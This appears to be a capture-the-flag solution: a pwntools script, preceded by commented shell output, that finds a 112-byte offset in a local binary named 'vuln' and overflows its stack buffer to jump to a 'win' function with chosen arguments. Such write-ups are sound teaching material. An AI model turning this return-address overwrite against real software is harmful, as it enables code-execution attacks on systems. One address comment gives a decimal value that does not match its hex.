# Ice1187$: cyclic 1000 | ./vuln
# Please enter your string: 
# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
# Segmentation fault
#
# Ice1187$: dmesg | grep vuln
# [9573.901466] vuln[3912]: segfault at 62616164 ip 0000000062616164 sp 00000000ffd6ccb0 error 14 in libc-2.28.so[f7d44000+19000]
# 
# Ice1187$: cyclic -l 0x62616164
# 112

from pwn import *

elf = ELF('./vuln')
padding = 'a'*112
ret = elf.symbols['win']    # 13451423
eip = p32(ret)              # hex(13451423) == 0x080485cb
padto0x8 = 'a'*4
arg = p32(0xDEADBEEF) + p32(0xDEADC0DE)

exploit = padding + eip + padto0x8 + arg

vuln = process('vuln')
vuln.recvuntil('string:')
vuln.send(exploit)
vuln.interactive()
